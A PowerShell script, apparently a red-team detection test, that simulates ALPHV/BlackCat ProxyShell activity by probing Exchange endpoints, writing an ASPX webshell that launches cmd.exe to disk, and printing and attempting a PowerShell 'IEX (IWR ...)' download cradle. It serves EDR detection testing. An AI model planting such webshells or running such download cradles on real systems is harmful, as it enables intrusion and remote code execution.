<#
.SYNOPSIS
    ALPHV/BlackCat ProxyShell Simulation - DETECTION TRIGGER
.DESCRIPTION
    Simulates ProxyShell exploitation by probing Exchange endpoints
    and creating webshell artifacts on disk.
    TTP: T1078, T1190
#>
$ErrorActionPreference = "SilentlyContinue"
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "127.0.0.1" }

Write-Host "[*] Starting ALPHV ProxyShell Simulation (T1078/T1190)" -ForegroundColor Cyan
Write-Host "[!] Target: $TargetIP" -ForegroundColor Yellow

# Step 1: Probe Exchange endpoints
Write-Host "`n[*] [T1190] Probing Exchange autodiscover endpoints..."
$endpoints = @(
    "https://$TargetIP/autodiscover/autodiscover.json",
    "https://$TargetIP/owa/",
    "https://$TargetIP/ecp/",
    "https://$TargetIP/mapi/nspi/"
)
foreach ($url in $endpoints) {
    Write-Host "    CMD: Invoke-WebRequest -Uri $url -Method HEAD"
    try {
        $resp = Invoke-WebRequest -Uri $url -Method HEAD -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop
        Write-Host "    [+] $url -> $($resp.StatusCode)" -ForegroundColor Green
    } catch {
        Write-Host "    [-] $url -> Connection failed (expected)" -ForegroundColor Gray
    }
}

# Step 2: Create webshell artifact on disk (T1505.003)
Write-Host "`n[*] [T1505.003] Creating webshell artifact..."
$webshellDir = "C:\temp\webshell_staging"
if (-not (Test-Path $webshellDir)) { New-Item -Path $webshellDir -ItemType Directory -Force | Out-Null }

$webshellContent = @"
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
// RTL DETECTION TEST - Simulated ASPX webshell
void Page_Load(object sender, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c whoami";
    p.Start();
}
</script>
"@
$webshellPath = "$webshellDir\error.aspx"
$webshellContent | Out-File $webshellPath -Encoding UTF8
Write-Host "    [+] Webshell created: $webshellPath" -ForegroundColor Green

# Step 3: PowerShell download cradle (T1059.001)
Write-Host "`n[*] [T1059.001] Executing PowerShell download cradle..."
Write-Host "    CMD: IEX (IWR 'http://$TargetIP/payload' -UseBasicParsing)"
try {
    Invoke-WebRequest -Uri "http://$TargetIP/payload" -UseBasicParsing -TimeoutSec 3 -ErrorAction Stop
} catch {
    Write-Host "    [-] Download failed (expected - detection still triggers)" -ForegroundColor Gray
}

Write-Host "`n[+] ProxyShell Simulation Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: Exchange endpoint probing, webshell file creation, PowerShell download cradle" -ForegroundColor Magenta
